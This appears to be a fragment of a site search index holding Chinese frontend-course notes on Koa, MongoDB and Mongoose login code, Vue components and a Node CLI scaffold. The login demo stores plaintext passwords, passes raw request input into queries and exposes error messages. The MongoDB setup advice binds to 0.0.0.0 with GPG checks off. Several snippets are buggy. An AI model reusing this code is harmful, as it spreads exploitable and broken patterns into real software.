\u57fa\u672c\u4ecb\u7ecd\uff1a\u8fd0\u884c\u5728\u540e\u53f0\uff08\u670d\u52a1\u5668\uff09</p> <p>\u4e09\u5927\u6846\u67b6\uff1aexpress\u3001koa(async await) \u89e3\u51b3\u5f02\u6b65\u7684\u65b9\u5f0f\u4e0d\u540c egg \u662f\u4f01\u4e1a\u7ea7\u5f00\u53d1\u6846\u67b6</p>"},{"location":"ebook-netease-senior-frontend/12-nodeJS%2BMongoDB%E7%99%BB%E5%BD%95%E7%B3%BB%E7%BB%9F/#_1","title":"\u6570\u636e\u5e93\u57fa\u7840","text":"<p>\u6570\u636e\u5e93\uff1a\u6570\u636e\u6301\u4e45\u5316\u4fdd\u5b58</p> <p>\u6570\u636e\u5e93\u5206\u7c7b\uff1a\u5173\u7cfb\u578b\u6570\u636e\u5e93\u548c\u975e\u5173\u7cfb\u578b\u6570\u636e\u5e93</p> <p>\u5173\u7cfb\u578b\u6570\u636e\u5e93\uff08\u5173\u7cfb\u6a21\u578b\uff0c\u5f88\u591a\u4e8c\u7ef4\u8868\u683c\u4e4b\u95f4\u76f8\u4e92\u5173\u8054\uff0c\u4e3b\u952e\u5916\u952e\uff09\u6570\u636e\u5e93-\u6570\u636e\u8868-\u8bb0\u5f55-\u5b57\u6bb5\uff0c\u53ef\u4ee5\u4f7f\u7528SQL\u8bed\u53e5\u64cd\u4f5c\uff08MYSQL\uff09</p> <pre><code>select username, password from account where id = 1\n</code></pre> <p>\u975e\u5173\u7cfb\u578b\u6570\u636e\u5e93\uff1aRedis\uff08\u5b58\u5728\u5185\u5b58\u4e2d\uff09 MongoDB\uff08\u5b58\u5728\u786c\u76d8\u4e2d\uff0c\u6620\u5c04\u5230\u5185\u5b58\u4e2d\uff09 nosql\uff08\u4e0d\u4ec5\u4ec5\u662fsql\uff09\u57fa\u4e8e\u952e\u503c\u5bf9\uff08key-value\uff09\u4e0d\u9002\u5408\u5927\u578b\u6570\u636e\uff0c\u6570\u636e\u5e93-\u6570\u636e\u8868-\u6587\u6863</p>"},{"location":"ebook-netease-senior-frontend/12-nodeJS%2BMongoDB%E7%99%BB%E5%BD%95%E7%B3%BB%E7%BB%9F/#mongodb","title":"MongoDB \u57fa\u672c\u64cd\u4f5c","text":""},{"location":"ebook-netease-senior-frontend/12-nodeJS%2BMongoDB%E7%99%BB%E5%BD%95%E7%B3%BB%E7%BB%9F/#_2","title":"\u4e0b\u8f7d\u5b89\u88c5","text":"<p>MongoDB \u5b89\u88c5\u5730\u5740\uff08windows\uff09\u5b89\u88c5\u5b8c\u6210\u540e\uff0c\u9700\u8981\u52a0\u5165\u73af\u5883\u53d8\u91cf\u3002\u5728\u5ba2\u6237\u7aef\u4e2d\u53ef\u4ee5\u4f7f\u7528\u547d\u4ee4\uff0c\u5373\u53ef\u64cd\u4f5c\u6570\u636e\u5e93\u3002MAC\u9700\u8981\u81ea\u5df1\u4e0b\u8f7d</p> <p>https://fastdl.mongodb.org/win32/mongodb-win32-x86_64-2012plus-4.2.0-signed.msi</p>"},{"location":"ebook-netease-senior-frontend/12-nodeJS%2BMongoDB%E7%99%BB%E5%BD%95%E7%B3%BB%E7%BB%9F/#mongodb_1","title":"MongoDB \u57fa\u672c\u64cd\u4f5c","text":"<p>\u8be6\u7ec6\u53c2\u8003\u4e0b\u9762\u7684\u8fd9\u4e2a\u5e16\u5b50 https://mp.weixin.qq.com/s/qN0eM8bZ_X-xX_g8Qhxbvw</p> <p>\u5c31\u662f\u5f53\u524d\u8def\u5f84\u4e0b\u9762\u7684 12-\u8f85\u52a9\u6587\u6863-nodejs-mongodb-mongoose.md</p> <p>MongoDB \u9002\u5408\u524d\u7aef\uff08\u5bf9\u6807\u963f\u91ccP6\uff0c\u9002\u54082-3\u5e74\u7684\u7814\u53d1\u4eba\u5458\uff09</p> <pre><code># \u4f20\u7edf\u7684SQL\u8bed\u53e5\nselect username, password from account where id = 10;\n\n# \u8fdb\u5165\nmongo\n\nshow dbs;\n\n# \u5982\u679c\u6ca1\u6709\u8fd9\u4e2a\u8868\uff0c\u5c31\u65b0\u5efa\u8fd9\u4e2a\u8868\nuse account;\n\ndb.account.insert({name: 'Mike'});\ndb.account.insert({name: 'Amy'});\ndb.account.insertOne({name: 'John', password: 666666});\ndb.account.insertMany([\n  {name: 'Tom', age: 20},\n  {name: 'Julia', age: 20},\n]);\n\ndb.account.find();\n# \u5982\u679cfind\u53c2\u6570\u7f3a\u7701\uff0c\u90a3\u4e48\u67e5\u8be2\u5168\u90e8\u7684\u6570\u636e\ndb.account.find({age: 20});\ndb.account.find({age: 30, name: \"Tony\"});\ndb.account.find({age: {$lt: 20}});\n# \u5e38\u7528\u7684\u6bd4\u8f83\u7b26\u53f7\n$lt === less than\n$lte === less than and equal\n$gt === greater than\n$gte === greater than and equal\n$ne === not equal\n\ndb.account.find({age: {$lt: 20}});\n\ndb.account.drop();\n</code></pre>"},{"location":"ebook-netease-senior-frontend/12-nodeJS%2BMongoDB%E7%99%BB%E5%BD%95%E7%B3%BB%E7%BB%9F/#_3","title":"\u4f8b\u5b50\uff1a\u767b\u5f55\u7cfb\u7edf","text":"<p>\u6848\u4f8b\u4f7f\u7528 nodeJS \u7684 KOA \u6846\u67b6</p> <p>\u65b0\u5efa\u4e00\u4e2a\u9879\u76ee package.json \uff08npm init\uff09</p> <p>\u9700\u8981\u5b89\u88c5\u7684\u4f9d\u8d56\u6709\uff1akoa koa-router</p> <pre><code>npm init\n# \u6838\u5fc3\u6846\u67b6\nnpm install koa -D\n# koa\u8def\u7531\u670d\u52a1\nnpm install koa-router -D\n# Koa-bodyparser\u5904\u7406\u89e3\u6790post\u8bf7\u6c42\nnpm install koa-bodyparser -D\n</code></pre> <p>\u672c\u5730\u5b89\u88c5 nodemon \u70ed\u542f\u52a8\u3001\u6d4b\u8bd5\u63a5\u53e3\u5de5\u5177\uff08postman\uff09\u6216\u8005Visual Studio Code \u7684 REST Client \u63d2\u4ef6</p> <p>package.json</p> <pre><code>{\n  \"name\": \"demo-koa\",\n  \"version\": \"1.0.0\",\n  \"description\": \"This is koa demo\",\n  \"main\": \"index.js\",\n  \"scripts\": {\n    \"test\": \"echo \\\"Error: no test specified\\\" &amp;&amp; exit 1\"\n  },\n  \"author\": \"Michael An\",\n  \"license\": \"ISC\",\n  \"devDependencies\": {\n    \"koa\": \"\",\n    \"koa-bodyparser\": \"\",\n    \"koa-router\": \"\",\n    \"mongoose\": \"\",\n  }\n}\n</code></pre>"},{"location":"ebook-netease-senior-frontend/12-nodeJS%2BMongoDB%E7%99%BB%E5%BD%95%E7%B3%BB%E7%BB%9F/#_4","title":"\u6587\u4ef6\u5939\u8def\u5f84","text":"<p>app.js \u5efa\u7acbhttp\u670d\u52a1</p> <p>Models \u64cd\u4f5c\u6570\u636e\u5e93</p> <p>routers \u8def\u7531</p> <p>Libs db.js \u4e13\u95e8\u8fde\u63a5\u6570\u636e\u5e93moongoose \u4e2d\u95f4\u4ef6 \u7528\u4e8eJS\u94fe\u63a5\u6570\u636e\u5e93</p> <p>Middleware \u4e2d\u95f4\u4ef6\uff08\u5982\u679c\u51fa\u9519\u4e86\uff0c\u670d\u52a1\u5668\u4e0d\u80fd\u6302\u6389\uff0c\u6240\u4ee5\u4f7f\u7528\u4e2d\u95f4\u4ef6try-catch\uff09koa \u6d0b\u8471\u6a21\u578b\u6355\u83b7\u9519\u8bef\uff08\u4e00\u5c42\u4e00\u5c42\u6355\u83b7\uff09</p>"},{"location":"ebook-netease-senior-frontend/12-nodeJS%2BMongoDB%E7%99%BB%E5%BD%95%E7%B3%BB%E7%BB%9F/#_5","title":"\u9ad8\u7ea7\u4f7f\u7528","text":"<p>bcrypt \u5bc6\u7801\u5bc6\u6587\u4f20\u9012\uff08crypto\uff09\u6216\u8005 Node-md5 \u52a0\u5bc6 </p> <p>JWT \u5355\u70b9\u767b\u5f55</p>"},{"location":"ebook-netease-senior-frontend/12-nodeJS%2BMongoDB%E7%99%BB%E5%BD%95%E7%B3%BB%E7%BB%9F/#_6","title":"\u9879\u76ee\u4ee3\u7801","text":"<p>/app.js</p> <pre><code>const Koa = require('koa');\nconst Router = require('koa-router');\nconst users = require('./routers/user');\n// \u5904\u7406POST\u8bf7\u6c42\nconst body = require('koa-bodyparser');\n// \u5904\u7406\u8bf7\u6c42\u9519\u8bef\nconst error = require('./middleware/error');\nconst app = new Koa();\napp.use(error);\napp.use(body());\n\nconst router = new Router();\n\nrouter.get('/', ctx =&gt; {\n  ctx.body = '\u4e3b\u9875'\n});\n\n// \u5b98\u65b9\u63a8\u8350\u8fd9\u6837\u5199\uff0c\u4e30\u5bcc\u54cd\u5e94\u5934\napp.use(router.routes());\napp.use(users.routes(), user.allowedMethods());\napp.listen(3000, () =&gt; {\n  console.log('listen http://localhost:3000');\n});\n</code></pre> <p>/routers/user.js</p> <pre><code>const Router = require('koa-router');\nconst router = new Router();\nconst { User } = require('../models/user');\n\nrouter.prefix('/api/user');\n\nrouter.get('/', ctx =&gt; {\n  ctx.body = '\u7528\u6237\u4e3b\u9875'\n});\n\n// \u67e5\u8be2\u7528\u6237\nrouter.get('/index', async ctx =&gt; {\n  ctx.body = await User.find();\n});\n\n// \u6ce8\u518c\nrouter.post('./register', async ctx =&gt; {\n  const { username, password } = ctx.request.body;\n  const user = await User.create({\n    username,\n    password\n  });\n});\n\n// \u767b\u5f55\nrouter.post('./login', async ctx =&gt; {\n  // ctx.body = 'login page';\n  const { username, password } = ctx.request.body;\n  const user = await User.findOne({\n    username,\n    password\n  });\n  if (!user) {\n    return ctx.body = {\n      status: 400,\n      message: 'User is not valid'\n    }\n  }\n  if (user) {\n    return ctx.body = {\n      status: 200,\n      message: 'login success'\n    };\n  }\n})\n\nmodule.exports = router;\n</code></pre> <p>/models/users</p> <pre><code>const mongoose = require('../libs/db');\n// \u53ef\u9009\uff1a\u52a0\u5bc6\nconst md5 = require('node-md5');\n\n// \u6307\u5b9a\u9ed8\u8ba4\u89c4\u5219\nconst UserSchema = new mongoose.Schema({\n  username: {\n    type: String,\n    unique: true\n  },\n  password: {\n    type: String,\n    // set(val) {\n    //  return md5(val);\n    // }\n  }\n});\n\n// \u4f7f\u7528\u89c4\u5219\nconst User = mongoose.model('User', UserSchema);\n\nmodule.exports = { User };\n</code></pre> <p>/libs/db.js</p> <pre><code>const mongoose = require('mongoose');\n\n// 27017 \u662f\u9ed8\u8ba4\u7684\u7aef\u53e3\u53f7;\u4e0b\u9762\u662f\u914d\u7f6e\nmongoose.connect('mongodb://localhost:27017/user', {\n  useNewUrlParser: true,\n  useUnifiedTopology: true,\n  useCreateIndex: true,\n  poolSize: 5\n});\n\nmodule.exports = mongoose;\n</code></pre> <p>/middleware/error.js</p> <pre><code>const error = async (ctx, next) =&gt; {\n  try {\n    await next();\n  } catch (error) {\n    ctx.body = {\n      message: 'server is error',\n      error: error.message\n    };\n  }\n}\n</code></pre> <p>\u8fd0\u884c http \u670d\u52a1</p> <pre><code>nodemon app.js \n</code></pre> <p>REST Client </p> <p>\u914d\u7f6e .http</p> <pre><code>@url = http://localhost:3000/api\n@type:Content-Type: application/json\n\nPOST {{url}}/user/register HTTP/1.1\n{{type}}\n{\n    \"username\": \"admin\",\n    \"password\": \"654321\"\n}\n</code></pre>"},{"location":"ebook-netease-senior-frontend/12-nodejs-mongodb-mongoose/","title":"nodejs\u5982\u4f55\u7528mongodb\uff1fmongoose\u5c31\u5bf9\u4e86","text":"<p>\u7edf\u8ba1\u4fe1\u606f\uff1a\u5b57\u6570 3329  \u9605\u8bfb7\u5206\u949f</p>"},{"location":"ebook-netease-senior-frontend/12-nodejs-mongodb-mongoose/#_1","title":"\u4e00\uff0c\u5b89\u88c5","text":"<p>windows\u5e73\u53f0\u4e0b\u5b98\u7f51\u76f4\u63a5\u4e0b\u8f7d\u5b89\u88c5\u5c31\u597d\u4e86\uff0ccentos\u4e0b\u5b89\u88c5\u6b65\u9aa4\uff1a</p> <p>\u914d\u7f6eMongoDB\u7684yum\u6e90</p> <pre><code>[mongodb-org]\nname=MongoDB Repository\nbaseurl=http://mirrors.aliyun.com/mongodb/yum/redhat/7Server/mongodb-org/4.0/x86_64/\ngpgcheck=0\nenabled=1\n</code></pre> <p>\u5b89\u88c5MongoDB</p> <p>\u5b89\u88c5\u4e4b\u524d\u5148\u66f4\u65b0\u6240\u6709\u5305 \uff1ayum update</p> <p>\u5b89\u88c5\u547d\u4ee4\uff1ayum -y install mongodb-org</p> <p>\u67e5\u770bmongo\u5b89\u88c5\u4f4d\u7f6e whereis mongod</p> <p>\u67e5\u770b\u4fee\u6539\u914d\u7f6e\u6587\u4ef6 \uff1avi /etc/mongod.conf   \u5982\u6570\u636e\u5e93\u8def\u5f84dbpath,bindIp: 172.0.0.1  \u6539\u4e3a bindIp: 0.0.0.0</p> <p>\u542f\u52a8\u505c\u6b62MongoDB</p> <pre><code>\u542f\u52a8mongodb \uff1asystemctl start mongod.service\n\u505c\u6b62mongodb \uff1asystemctl stop mongod.service\n\u67e5\u5230mongodb\u7684\u72b6\u6001\uff1asystemctl status mongod.service\n\u8bbe\u7f6e\u5f00\u673a\u542f\u52a8\uff1asystemctl enable mongod.service\n\u91cd\u542fmongodb\uff1asystemctl restart mongod.service\n\u542f\u52a8Mongo shell\uff1amongo\n</code></pre>"},{"location":"ebook-netease-senior-frontend/12-nodejs-mongodb-mongoose/#nodejs","title":"\u4e8c\uff0cnodejs\u5e93\u9009\u62e9","text":"<p>\u4e0b\u9762\u4e09\u4e2a\u90fd\u4e0d\u9519\uff0c\u6211\u662f\u9009\u62e9\u4e86mongoose\u4e3b\u8981\u662fgithub star\u591a,\u4fbf\u4e8e\u4f7f\u7528\uff0c\u800c\u4e14\u6709\u4e2d\u6587\u6587\u6863\uff0c\u4e5f\u4e00\u76f4\u6709\u66f4\u65b0\u3002</p> <p>mongodb\uff08\u4e5f\u53eb node-mongodb-native\uff09mongodb</p> <p>\u5b98\u65b9\u5e93\uff0c\u5305\u542b\u4e86\u6240\u6709\u4e14\u6700\u65b0\u7684 api\uff0c\u5176\u4ed6\u5927\u90e8\u5206\u7684\u5e93\u90fd\u662f\u5728\u8fd9\u4e2a\u5e93\u7684\u57fa\u7840\u4e0a\u6539\u9020\u7684\u3002\u4f46\u662f\u5462\u4e0d\u652f\u6301\u6587\u6863\u6821\u9a8c\uff0cmongodb \u662f no schema \u7684\uff0cMongoose \u901a\u8fc7 Schema \u652f\u6301\u6587\u6863\u6821\u9a8c\uff0c\u53ef\u4ee5\u9632\u6b62\u975e\u6b63\u5e38\u60c5\u51b5\u4e0b\u5199\u5165\u9519\u8bef\u7684\u6570\u636e\u5230\u6570\u636e\u5e93\u3002</p> <p>Mongoose</p> <p>\u5c01\u88c5\u4e86\u6570\u636e\u5e93\u7684\u64cd\u4f5c\uff0c\u7ed9\u4eba\u7684\u611f\u89c9\u662f\u540c\u6b65\u7684\uff0c\u5176\u5b9e\u5185\u90e8\u662f\u5f02\u6b65\u7684\u3002\u529f\u80fd\u5f3a\u5927\uff0c\u5b98\u65b9\u6587\u6863\u8be6\u7ec6http://www.mongoosejs.net/</p> <p>Mongolass</p> <p>\u4fdd\u6301mongodb \u4e00\u6837\u7684 api\uff0c\u501f\u9274\u4e86 Mongoose \u7684\u4f18\u70b9\uff0c\u540c\u65f6\u53c8\u4fdd\u6301\u4e86\u7cbe\u7b80\u3002</p>"},{"location":"ebook-netease-senior-frontend/12-nodejs-mongodb-mongoose/#_2","title":"\u4e09\uff0c\u6570\u636e\u5e93\u94fe\u63a5","text":"<p>\u65b0\u5efadb.js</p> <pre><code>'use strict';\nvar mongoose =require('mongoose');\nconst dburl='mongodb://localhost/test';\nmongoose.connect(dburl);\nconst db = mongoose.connection;\n\ndb.once('open' ,() =&gt; {\n  console.log('\u8fde\u63a5\u6570\u636e\u5e93\u6210\u529f');\n})\n\ndb.on('error', function(error) {\n  console.error(\n    'Error in MongoDb connection: ' + error\n  );\n  mongoose.disconnect();\n});\n\ndb.on('close', function() {\n  console.log('\u6570\u636e\u5e93\u65ad\u5f00\uff0c\u91cd\u65b0\u8fde\u63a5\u6570\u636e\u5e93');\n  mongoose.connect(dburl, {server:{auto_reconnect:true}});\n});\n\nmodule.exports = db;\n</code></pre>"},{"location":"ebook-netease-senior-frontend/12-nodejs-mongodb-mongoose/#_3","title":"\u56db\uff0c\u6570\u636e\u5e93\u64cd\u4f5c","text":"<p>Schema,model\u7684\u4f7f\u7528</p> <p>Schema\u5b9a\u4e49\u3002\u65b0\u5efauser.js</p> <pre><code>var mongoose = require('mongoose');\nvar Schema = mongoose.Schema;\n\n// \u58f0\u660e\u4e00\u4e2a\u6570\u636e\u96c6 \u5bf9\u8c61\nvar userSchema = new Schema({\n  username: {\n    type: String,\n    unique: true\n  },\n  password: {\n    type: String\n  }\n}, {\n  versionKey: false,\n  timestamps: true\n});\n// \u5c06\u6570\u636e\u6a21\u578b\u66b4\u9732\u51fa\u53bb\nmodule.exports = mongoose.model('users', userSchema);\n</code></pre> <p>timestamps\u4f1a\u81ea\u52a8\u589e\u52a0\u521b\u5efa\u65f6\u95f4createdAt\uff0c\u66f4\u65b0\u65f6\u95f4updatedAt</p> <p>\u5f88\u591a\u6559\u7a0b\u662f\u8fd9\u6837\u7684\u5199\u7684</p> <p>updatedAt: { type: Date, default: Date.now }</p> <p>\u8fd9\u4e2a\u5199\u6cd5\u6bcf\u6b21\u66f4\u65b0\u5e76\u4e0d\u80fd\u66f4\u65b0updatedAt\u8fd9\u4e2a\u5b57\u6bb5\uff0c\u8fd8\u662f\u8981\u5199\u4ee3\u7801\u53bb\u5904\u7406\u3002</p> <p>\u53e6\u5916\u6ce8\u610f\u4e0d\u80fd\u5199\u6210default: Date.now()</p> <p>model\u7684\u4f7f\u7528</p> <pre><code>// \u67e5\u627e\nUser.findOne({\n  username: 'abc',\n  password: 'abc'\n}, function (err, data) {\n  if(err) throw err;\n  console.log(dat)\n})\n// \u4fdd\u5b58\nconst saveData = {\n  username: 'abc',\n  password: 'abc',\n};\nUser.create(saveData, function (err, data) {\n  if (err) throw err;\n  console.log(data);\n})\n</code></pre> <p>\u66f4\u591a\u8be6\u7ec6\u64cd\u4f5c\u89c1mongoose\u5b98\u65b9\u6587\u6863http://www.mongoosejs.net/</p>"},{"location":"ebook-netease-senior-frontend/13-%E4%BD%BF%E7%94%A8VUE%E5%88%9B%E5%BB%BA%E7%BB%84%E4%BB%B6%EF%BC%88%E6%B2%A1%E5%AD%A6%E5%AE%8C%EF%BC%89/","title":"\u8bfe\u65f613 \u4f7f\u7528VUE\u521b\u5efa\u7ec4\u4ef6","text":"<p>\u7edf\u8ba1\u4fe1\u606f\uff1a\u5b57\u6570 685  \u9605\u8bfb2\u5206\u949f</p> <p>\u8bb2\u5e08\uff1a\u8c2d\u91d1\u9f99</p>"},{"location":"ebook-netease-senior-frontend/13-%E4%BD%BF%E7%94%A8VUE%E5%88%9B%E5%BB%BA%E7%BB%84%E4%BB%B6%EF%BC%88%E6%B2%A1%E5%AD%A6%E5%AE%8C%EF%BC%89/#_1","title":"\u73af\u5883\u642d\u5efa","text":"<p>VUE \u7ec4\u4ef6\u4f20\u503c+\u63d2\u69fd</p> <p>VUE-cli \u811a\u624b\u67b6\u7684\u5b89\u88c5</p> <p>Vue-cli3 \u4e0b\u9762\u7684UI\u6846\u67b6\u8bbe\u8ba1\uff08\u6700\u65b0\u7684\u7248\u672c4.2\uff0923\u7248\u672c\u533a\u522b\u8f83\u5927</p> <p>elementUI</p> <p>package.json \u751f\u6210\uff0c\u5b89\u88c5\u4e0b\u9762\u7684\u4f9d\u8d56</p> <pre><code>@vue-cli\n</code></pre>"},{"location":"ebook-netease-senior-frontend/13-%E4%BD%BF%E7%94%A8VUE%E5%88%9B%E5%BB%BA%E7%BB%84%E4%BB%B6%EF%BC%88%E6%B2%A1%E5%AD%A6%E5%AE%8C%EF%BC%89/#_2","title":"\u5f00\u53d1\u7ec4\u4ef6","text":"<p>\u5148\u5220\u9664\u754c\u9762VUE\u4e00\u5b9a\u5b9a\u4e49\u7684\u4e1c\u897f</p> <p>Packages/button/src/button.vue</p> <pre><code>&lt;template&gt;\n    &lt;div id='app'&gt;\n    &lt;h1&gt;UI&lt;/h1&gt;\n  &lt;/div&gt;\n&lt;/template&gt;\n\n&lt;script&gt;\n  export default {\n    name: 'App',\n    components: {\n\n    }\n  }\n&lt;/script&gt;\n&lt;style lang='sass'&gt;\n&lt;/style&gt;\n</code></pre>"},{"location":"ebook-netease-senior-frontend/13-%E4%BD%BF%E7%94%A8VUE%E5%88%9B%E5%BB%BA%E7%BB%84%E4%BB%B6%EF%BC%88%E6%B2%A1%E5%AD%A6%E5%AE%8C%EF%BC%89/#npm","title":"\u6253\u5305\u4e0a\u4f20\u5230npm","text":"<p>\u73b0\u5728\u6bd4\u8f83\u5361\uff0c\u6240\u4ee5\u6682\u65f6\u4e0d\u5b66\u3002\u628a\u65e7\u7684\u5185\u5bb9\u5148\u5b66\u4f1a\u3002\u8fd9\u4e00\u4e2a\u8bfe\u65f6\u4e3b\u8981\u7528VUE</p>"},{"location":"ebook-netease-senior-frontend/16-%E6%9E%84%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E8%84%9A%E6%89%8B%E6%9E%B6%E5%B7%A5%E5%85%B7/","title":"16-\u5229\u7528node\u6784\u5efa\u81ea\u5df1\u7684\u811a\u624b\u67b6\u5de5\u5177","text":"<p>\u7edf\u8ba1\u4fe1\u606f\uff1a\u5b57\u6570 5371  \u9605\u8bfb11\u5206\u949f</p>"},{"location":"ebook-netease-senior-frontend/16-%E6%9E%84%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E8%84%9A%E6%89%8B%E6%9E%B6%E5%B7%A5%E5%85%B7/#_1","title":"\u8bfe\u7a0b\u5927\u7eb2","text":"<p>1\u3001\u5982\u4f55\u5229\u7528node\u7f16\u5199\u547d\u4ee4\u884c\u811a\u672c\uff08\u64cd\u4f5c\u547d\u4ee4\u884c\uff09 2\u3001\u811a\u624b\u67b6\u5de5\u5177\u5e38\u7528\u7684\u5305\u6709\u54ea\u4e9b 3\u3001\u5e26\u4f60\u624b\u64b8\u4e00\u4e2a\u81ea\u5df1\u7684 vue-cli</p> <p>\u53ef\u4ee5\u81ea\u5df1\u505a\u9879\u76ee\u4e13\u5c5e\u7684\u811a\u624b\u67b6\u5de5\u5177</p>"},{"location":"ebook-netease-senior-frontend/16-%E6%9E%84%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E8%84%9A%E6%89%8B%E6%9E%B6%E5%B7%A5%E5%85%B7/#_2","title":"\u5982\u4f55\u64cd\u4f5c\u547d\u4ee4\u884c","text":"<p><code>npm run build</code> \u6267\u884c\u7684\u662f build.js \u811a\u672c</p>"},{"location":"ebook-netease-senior-frontend/16-%E6%9E%84%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E8%84%9A%E6%89%8B%E6%9E%B6%E5%B7%A5%E5%85%B7/#nodejs","title":"\u5e38\u89c1\u7684 nodeJS \u5305","text":"<pre><code>chalk \u8f93\u51fa\u4e0d\u540c\u989c\u8272\u7684\u6587\u5b57\uff08\u5f00\u53d1\u811a\u672c\u7684\u6548\u679c\u7684\u5305\uff09\nora loading \u7684\u6548\u679c\ncommander \u89e3\u6790\u547d\u4ee4\uff08-v\uff09\ninquirer \u63d0\u95ee\u67e5\u8be2\u7684\u5305\uff08npm init \u7136\u540e\u4f1a\u63d0\u95ee\uff0c\u540d\u79f0\u662f\u4ec0\u4e48\uff09\n</code></pre> <p>\u7ec3\u4e60 build.js</p> <pre><code>process.env.NODE_ENV = 'production';\n\nconst ora = require('ora');\nconst rm = require('rimraf');\nconst path = require('path');\nconst chalk = require('chalk');\nconst webpack = require('webpack');\nconst config = require('../config');\nconst webpackConfig = require('./webpack.prod.conf');\n\n// \u5f00\u59cbloading\u72b6\u6001\nconst spinner = ora('building for production...loading...');\nspinner.start();\n\nconst { assetsRoot, assetsSubDirectory } = config.build;\nrm(path.join(assetsRoot, assetsSubDirectory), err =&gt; {\n  if (err) {\n    throw err;\n  }\n  webpack(webpackConfig, (err, stats) =&gt; {\n    // webpack \u7f16\u8bd1\u7ed3\u675f\u540e\uff0c\u505c\u6b62loading\u72b6\u6001\n    spinner.stop();\n    if (err) {\n      throw err;\n    }\n    process.stdout.write(stats.toString({\n      colors: true,\n      modules: false,\n      children: false, // if use ts-loader, set this true\n      chunks: false,\n      chunkModules: false\n    }) + '\\n\\n');\n\n    if (stats.hasError()) {\n      // handle error\n      console.log(chalk.red('Build failed with errors.\\n'));\n      process.exit(1);\n    }\n    console.log(chalk.cyan('Build complete.\\n'));\n  });\n});\n</code></pre> <p>\u4e0b\u9762\u662f\u4e00\u6b65\u4e00\u6b65\u7684\u6559\u7a0b</p> <pre><code>npm install chalk ora commander inquirer --save\n</code></pre> <pre><code>const chalk = require('chalk');\nconsole.log(chalk.red.bgBlue('Hello'));\nconsole.log(chalk.rgb(126,126,126).bgRgb(22,33,89)('hello'));\n\nconst spinner = ora('this is a loading').start();\nspinner.color = 'yellow';\nspinner.text = 'hello nodeJS';\nsetTimeout(function() {\n  spinner.stop();\n}, 3000);\n</code></pre> <p>\u81ea\u5b9a\u4e49\u547d\u4ee4 package.json</p> <pre><code>{\n  \"bin\": {\n    \"mytool\": 'index.js'\n  }\n}\n</code></pre> <p>\u5982\u679c\u5df2\u7ecf\u53d1\u5e03\u8fd9\u4e2a\u5e93\uff0c\u76f4\u63a5\u8fd0\u884c\u6267\u884c\u811a\u672c\u5373\u53ef\u3002\u5982\u679c\u6ca1\u6709\u53d1\u5e03\uff0c\u672c\u5730\u9996\u5148\u8fd0\u884c npm link \u94fe\u63a5\uff08\u53ef\u80fd\u62a5\u9519\uff0c\u94fe\u63a5\u591a\u6b21\uff09\uff0c\u7136\u540e\u624d\u80fd\u6b63\u5e38\u4f7f\u7528\u547d\u4ee4\u3002</p> <p>Index.js \u811a\u672c</p> <pre><code>#!/usr/bin/env node\nconst cm = require('commander');\nconst iq = require('inquirer');\ncm.version('1.0.0', '-v, --version');\ncm.option('-a -atest', 'this is test');\nconsole.log(1);\ncm.command('init &lt;name&gt;').action((name) =&gt; {\n  console.log(name);\n  iq.prompt([\n    {\n      type: 'input',\n      name: 'author',\n      message: 'what is your name'\n    }\n  ]).then((answers) =&gt; {\n    require('./bin/dowuload.js')(answers.author);\n  });\n});\ncm.parse(process.argv);\n</code></pre> <p>download.js</p> <pre><code>const fs = require('fs');\nconst chalk = require('chalk');\nconst ora = require('ora');\n\nmodule.exports = function(answer) {\n  // \u6570\u636e\u9a71\u52a8\n  // fs.readFile fs.read fs.createWriteStream\n  //[\n  //  {type: 'file', path: './app.js'},\n  //  {type: 'dir', path: './src'},\n  //  {type: 'dir', path: './src/route'},\n  //]\n    const demoPath = './project';\n  const targetPath = './' + answer;\n  const ob = [];\n  function downdemo() {\n    // fs.mkdir(targetPath, () =&gt; { pushArr(demoPath); });\n    pushArr(demoPath);\n    console.log(ob);\n    ob.forEach((item) =&gt; {\n      if (ob[i][0] == 'file') {\n        fs.readFile(ob[i][1], (err, data) =&gt; {\n          fs.writeFile(targetPath + '/' + ob);\n        });\n      } else {\n        fs.mkdir(targetPath + '/' + item[1].replace('./project', ''), function() {})\n      }\n    });\n  }\n  function pushArr(path) {\n    fs.readdir(path, function(files) {\n      files.forEach((item, index) =&gt; {\n        fs.stat(path + '/' + item, (err, stat) =&gt; {\n          if (stat.isDirectory()) {\n            ob.push(['dir', path]);\n            pushArr(path + '/' + item);\n          } else {\n            ob.push(['file', path]);\n          }\n        });\n      });\n    });\n  }\n}\n</code></pre>"},{"location":"ebook-netease-senior-frontend/16-%E6%9E%84%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E8%84%9A%E6%89%8B%E6%9E%B6%E5%B7%A5%E5%85%B7/#cli","title":"\u5982\u4f55\u6784\u5efaCLI","text":"<p>\u9879\u76ee\u811a\u624b\u67b6 Vue-cli</p> <ul> <li>\u4e0b\u8f7d\u9879\u76ee\u521d\u59cb\u5316\u6a21\u677f</li> <li>\u5b9a\u4e49\u9879\u76ee\u89c4\u5219</li> <li>\u5b9a\u4e49\u9879\u76ee\u64cd\u4f5c\u547d\u4ee4</li> </ul> <p>CLI \u5de5\u5177\u5de5\u4f5c\u6d41\u7a0b\uff1a\u7528\u6237\u8f93\u51fa\u521d\u59cb\u5316\u547d\u4ee4-\u6253\u5f00\u811a\u672c\u4e0e\u7528\u6237\u4ea4\u4e92-\u6839\u636e\u547d\u4ee4\u4e0b\u8f7d\u6a21\u677f-\u6a21\u677f\u4e0b\u8f7d\u6210\u529f-\u63d0\u793a\u7528\u6237</p> <p>\u9012\u5f52\uff0c\u6bcf\u6b21\u9012\u5f52\u5c06\u6587\u4ef6\u8def\u5f84\u62ff\u51fa\u6765\uff0c\u53d8\u6210\u6570\u7ec4\uff1b\u7136\u540e\u904d\u5386\u6570\u7ec4\uff0c\u521b\u5efa\u6587\u4ef6</p> <p>\u5177\u4f53\u7684\u6587\u4ef6\u4e0d\u597d\u64cd\u4f5c\u65f6\uff0c\u5148\u628a\u6811\u7ed3\u6784\u62bd\u8c61\u51fa\u6765\uff1b\u521b\u5efa\u6587\u4ef6\u548c\u521b\u5efa\u6587\u4ef6\u5939\uff1b\u8bfb\u5199\u548c\u904d\u5386\uff0c\u8026\u5408\u6bd4\u8f83\u9ad8</p> 